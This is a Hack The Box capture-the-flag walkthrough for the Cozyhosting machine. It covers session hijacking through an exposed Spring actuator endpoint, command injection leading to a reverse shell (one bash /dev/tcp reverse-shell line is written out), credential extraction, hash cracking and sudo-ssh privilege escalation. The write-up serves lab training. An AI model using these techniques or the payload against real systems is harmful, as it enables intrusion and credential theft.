# Hack The Box Walkthrough: Cozyhosting
### Written by Nikolaos Bakirtzis
### [Follow me on LinkedIn](https://www.linkedin.com/in/nikolaos-bakirtzis/)

## Machine Overview
- **Name:** Cozyhosting
- **IP Address:** 10.10.11.230
- **Difficulty:** Easy
- **Operating System:** Linux
- **Release Date:** September 2, 2023

## Summary
CozyHosting is an Ubuntu system hosting a Spring Boot Web Application. It is a relatively easy Linux machine that simulates a scenario where an attacker gains access to a web hosting server. The machine is desgined to teest various skills, including web application security, privilege escalation, and lateral movement within a network.

## Table of Contents
1. [Enumeration](#enumeration)
2. [Exploitation](#exploitation)
3. [Privilege Escalation](#privilege-escalation)
4. [Conclusion](#conclusion)

## Enumeration
Started with a quick nmap scan to identify open ports on the system. I run a SYN scan with the -p- option to scan for all 65,535 ports. In case of an IPS/IDS or firewall, you should be careful with the traffic you generate since your machine could potentially get exposed and get you in trouble.

![](https://lh7-us.googleusercontent.com/B2q87DTGVO8h_LndhFzmzyaYbAj7OtlMXUeBrU3mqqrouPuZfG0wzPILVSFJ-A-BQJZEKNwQEqgQmfVpLaoIBt7XpTKpxRM9xfNUwbvvHo8tznNBnvIbHDf6RpeQBYhEjlN6Uju5ILV4QykG_7CiCKM)

We have port 22 and port 80 open. Port 80 indicates that a web application exists so I looked up the IP address on my browser.

![](https://lh7-us.googleusercontent.com/4ObBWCKIH7XB_gNmnePcE7itb2QNOHk0DAVHg8NV8TsbHfGs7YQWBBJU-OF6K-pVYkJ_fUj3T7x-fDsqDD4qLLFPmRhzZZTj7B_aOjkgb-uzCOUwgiOJ7Kv64ziUFOmTUsEEdP0oBmfOGLbvUMr3PNM)

There was nothing interesting on the source code of the page except some information about the Bootstrap version of the website, so I browsed to the login page. 

![](https://lh7-us.googleusercontent.com/cng1GyhnBZ-4lU84SinkeHJBw4Fo5e5TtvfmO0rk9Nny3FRREfONDyDk_kctt27xfG9vfN1GdBd37gM4CUHhz652-Ifi6sX94XuX0FGrqPm5ekR_CGivTnTS10uZRI_jlK2b9c7pNgjyhk0gFzniawk)

Running a whatweb scan gave me some extra information about the server and its version (nginx 1.18.0) which could be helpful later as it is outdated.

![](https://lh7-us.googleusercontent.com/UWfqbkt-nwJdVXNx5H9xfUNwmbYd_AHpDx5QCG7S7Q_cWHNZwLDZK5DLNeUS2ALT5AsCl6Cd4Ns6PM8SMGsIsc5V3N6g937G6bPCR8JitNIqXGkVqK9jhNUfid4aX6adHxtXGzrmcCZlLWR38miTDTk)

I also started an nmap version scan to learn more about the SSH and HTTP services. 

![](https://lh7-us.googleusercontent.com/yxAoj7CMtMEsfMY1k8fp0T0X2UcaIq7DQbUK_9PWWB7Wn_S580BLyIazQu9xabe2Ks6E5Bcq_tYQDVaxz0-DkBY-lBxi-dm7j-mszuATZYNDfqu1jxOZ9KCSzFPslWuYwoy6krpwYYK_fnPZHHI_ZKQ)

We have OpenSSH 8.9p1 running on port 22, and a nginx 1.18.0 server on port 80.

Running a directory enumeration using fuff (I used a large wordlist from SecLists), we discover the /actuator/sessions directory which includes usernames and their session IDs.

![](https://lh7-us.googleusercontent.com/P-xkJkVuErzmZgbwL0rnfNnkuGUmq9U3HVziKxMG-XHICbLcEnQOXrBjIXpDMFGcBjax1XFS1M99MM5QRUvKpZruNer62vj2EDo_i6QyexFLxJsPjzEer0ba0vZEz2kquaxG9vRsDHuwWu1ctIvI5q4)

## Exploitation
Using Burp Suite's repeater to proxy my requests, I sent a malformed login request with the session ID that I found earlier and set my username to kanderson. 

![](https://lh7-us.googleusercontent.com/tVaaCuwsGYvrk5iOvSV1FbXqK_gB3e2sdAsyicQC8wH72gbkh9kwgzoT7-LWpkVveViWhxafXYXFvDF9huyJ9EhJqQFgiaUuuLe0Sx3BmiOdTKH3mGDtFjoEbx3s1n1LCHlqHmaazpm6-NztNdpYFEI)

This logged me in as K. Anderson who was an administrator account. I was directed to the admin dashboard. 

![](https://lh7-us.googleusercontent.com/-5nLSqpvqmgrXDx9a-2lKSJyfqN3ZAyGjyCkizIcwTzGghjshk9yh7FfRYmY3eHi5QPuKZ12Aj9eXT0U7-NaR6eWu53vMzpaxfyKOHQJ-I4AKzzFjeHEBWHtoSdtdutG1yMbMBkE5qpx2BAEL3CrTWI)

Looks like there is no settings tab or any other interesting pages so I focused on the dashboard page. If we scroll down, we can see an SSH function that looks vulnerable as it allows a connection to another host.

![](https://lh7-us.googleusercontent.com/5-7zG9hsXZzK8t3Akpir_aVpdmNrvpOROqonLs2F24Vh01RtfK1IyGTfpf7ApQS5bpydX0AN3J2m5-Col5AX8nYiQWx73EPXTY3zVebC4aSRYAjDUPKG62ki1Usdh2zCMDLpLcXyZx0-QEa58kGTi4k)

I was testing the function for possible command injections by playing with the username variable on the HTTP request. When I entered test' in the username field, I got an interesting response indicating the possibility of getting a reverse bash shell through a malformed HTTP request to the executessh function, indicating a command injection vulnerability. We then start a Netcat listener on our machine and set it to listen to any unused port we want (I chose 1234), in order to get the reverse shell connection. I used this bash reverse shell payload (enter you local machine's IP): bash -i >& /dev/tcp/10.0.0.1/1234 0>&1. After that, I encoded it to Base64 and then URL encoded the key character through Burp Suite. Now we input the payload as the username and the localhost (127.0.0.1) as the host IP.

![](https://lh7-us.googleusercontent.com/TVplMA___qhKHijL1Ya81v7VvHtMKlZmsgNc1YHIkm65fRHJgsd06ueGbalu6sdLrtltSJ2qsohGaw5e1iIE4gMXb2dm0XoNFyowPbeLXQ1l0EflourZMO4yu40DmIQYuBUSTJp5WpUFKZ9fCynL4RE)

![](https://lh7-us.googleusercontent.com/WlgnnLggXfLzoTYZcvBApni9-UM6URkYu5mvdSh40LTyVvRsEHkJITF94ESyW91fPgt4scxL_EwErI44eIICbrzapRzOH91QRFb4B7VH9J4oaMsvYZ7S6x4rG7WrJ8Ii2EmkX0mZJtSiOuVLhuuhGRM)

We now have access to the system and we are able to see that python3 is installed (Try: which python or which python3). We can use that information to upgrade our shell to a TTY one using the Python trick.

![](https://lh7-us.googleusercontent.com/o8pz7EPEZeBR-s8Q0h4XCi-iyOYfcO-LLtv817PceCOSP_-WoA1GO0vu-kL2YBpMMi7PF90NwZIlS_vtR9OcJ1zjm3nYjU3PFhst1WSbSD9bjzVpRnQxso_LjdWmPvLDGZ40iJOMmDOOctVZ-GVRwtE)

After listing the current directory, we find an interesting cloudhosting jar file. Which we can download on our local machine for further inspection.

Local machine (start an HTTP server using python on port 8000):

![](https://lh7-us.googleusercontent.com/hSbYcF4i80scC3s215aP4ktc881eF_Cpb8OH3aORila96Vur-AxxaOA5L0J2dzskwEyV2yT6UYFv2_eW6tHAnSR2tXJOsHwa6lcYt5PTq9rHhEEa6K6M-J2jbr8uvIEh0UKWeZUmhL4NUNvP4BNofOY)

Cozyhosting machine (sent a wget request to my local machine's HTTP server to download the file):

![](https://lh7-us.googleusercontent.com/YeWP_GWzVQ0SlZoBCsVt-7IyEiOKQ6jqoJ5KYoOg7ITcpGelhlj37eCg9f4-Otu8gZdDtzlsFD7QJcD6tdWr8IVH4yQd5hLHrHRXjhA3qHfMKjvx6YAPP-4i1CFWDOjNOxV_EqF0j8HGxr8Q_SvSijM)

We can now open the zip file using jd-gui (Download: sudo apt-get jd-gui). Looking at the application.properties file, we find some PostgreSQL database credentials. 

![](https://lh7-us.googleusercontent.com/93qMF-DRe6coD1PKBiJIQZv1KdUZvxkn7DUQ8yhFTUNACdHoGJEs96XZ6FZ_ZeYZ5RV3q6oVVu7rcJfhTmUahDYaaIUUariL5th1-t1BJlVQ6hFmdN0g7SB-W9hgFQZ8qGjpTkQTnwVy-nHJHF-__8g)

I logged in using those credentials. We now have access to the PostgreSQL database.

![](https://lh7-us.googleusercontent.com/lsJiii8uqpmzvgcJEy4Cb5HZpjwJkl0wys3sYVcUEm0JxZrmPwKQOvkDe1XoJIDRPLu37extoomxQ6sSa5YFsoEQlUF1wJNQn1c0QxtThZbFz9ZGAlRxjdTbJWMpyi-DkB5EVl7t1V0dZqVGpzccViU)

We can list the directories and find a cozyhosting directory that we browse into.

![](https://lh7-us.googleusercontent.com/GTPMnHsAnpn7VlP8P4vMH0dK4PhAIpAjLFGVqsAaccvztrX1b4_CD2o27j1srNpZMO6XQvbmWQiZfOzMDE-OV1zYYBsoWJ8N8JsiBpVNQvi-vCjPIp2Mkvj6Yd1me6YjlxZUli81GcUn0_M_ol2pL7w)

Inside cozyhosting we find the users directory where we get admin password hashes. We'll crack the hashes using John The Ripper. 

![](https://lh7-us.googleusercontent.com/L0ASvot7y7xtGEZFJ06FzYMI_1G3tJH6kp3IQOSiQBJPteSnBCBzy4-0AHY48tk7MF5h8I-cuz23IlI8Tz4MC2BwIJUuZIF36Cq4nc6gj9H80MtuP4RRUH7yJInNaN1ySqqm0v-gXx3b-0SeJ87Q2-w)

![](https://lh7-us.googleusercontent.com/ujcxtLgXdH2CakLcIb2_uLU5lZAh75eJzQxOEpiYx_gYhX__n52j3sm5FButZ3dVVOp5EWb1uW-j2SHRV-8sExNLdckIBGLCH4zVMvxTmzvng9dV2JYenPTZ_02mMiM6SCdZgmBSFBv9iIADrCybpso)

I also looked at the /etc/passwd file and discovered user josh. I tried to login through SSH using the username josh and the password John The Ripper cracked. The login was successful. 

![](https://lh7-us.googleusercontent.com/fXfLcnfgmWudrjBlzJAcUrlsm9hdzDc0YCfxruNo69mp_CTpMsHOD62ulrdIlF1pnRYRPHa9ZPTpr7_P8YasOvwwBrLWrUHgHd3eCBMVidW4EDmBWwZW-Jj0g_ZDRCDcT30ouVCTVmZU7XkAuFazIGI)

![](https://lh7-us.googleusercontent.com/Eo8KZ3578RQi-zTlRrsDIZNXZQ2LeggH4U5HeEM-BRsV6hehrUsoDxrGniOg5eHiwQK2EiKqjRYPlKrQTj2g1Jnn6lbVPsdI6v9H8UgZLfh3XgED0J7JuNt2eMg5FbDE6JnPVp2SwUfCAzRtZoCfJIM)

We list the current directory and get the user flag. I also transferred the LinEnum.sh script to the cozyhosting machine but escalating privileges was easier than I thought so I ended up not following its recommendations.

![](https://lh7-us.googleusercontent.com/SNdtQonzn6KLV2vB0ZDKLJp1ppT97q5lV6WCPAbc8NnzugCbrxpoNy1f4Az6EOWTEziMCMw3f_I-e7PIx1J9sXA3ZHs-wPuS5cMZ5fdt98TatEp7oMcwS1-1BCDuBtDAE2MTupr0hLowtfg_yTLoFqg)

## Privilege Escalation
If we run "sudo -l", we see that user josh can run /usr/bin/ssh * with sudo privileges on     localhost.

![](https://lh7-us.googleusercontent.com/I3296yx_OVBlmds-3bLFs4CglIxd7ot_L40G9Mmct0rLEAcH8MLgFJ1qVxlTFCq31R3GBxXynyAdo1n3aEIyscTZqU8MkIIVk8ma4Moi_qutQ5d38a5wjYzWcb0QSIHdxUK1QnW0Kgxc7moRAdpJiHQ)

GTFOBins (<https://gtfobins.github.io/>) has a simple payload that we can use to abuse this misconfiguration and give us root privileges on the system. 

![](https://lh7-us.googleusercontent.com/wrW-igke5q-XymJTqH59U-x41Ptr69Gn7Tu7qzA0hnxW3aULrUabdHhrpnbNwWHWZI7gJsEPUx2w_CmydWzpL2K5x8t1T5cENQ0OgP84VX_Vm9Kv3yYL9zHaT-nr17mv3kxu5gVUrp3vZ1EImTk-h5U)

![](https://lh7-us.googleusercontent.com/CmxOE_m1h50wsKdqSGe1cKVDcfklecJyJgh3YaCFVUYq3-qPOwMfvsqaHRcG4j7-ljz5JGi0cfmSuR9X02rrR6EwlQD517PtCVe-J2GbmK487vBUlmb1qx6_sCaR5K4YVwaemCZH_5xtfi408JV-Wp0)

## References
- [Hack The Box](https://www.hackthebox.com/)
- [Cozyhosting Machine](https://app.hackthebox.com/machines/CozyHosting)
- [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [GTFOBins](https://gtfobins.github.io/)
- [Markdown Guide](https://www.markdownguide.org/)

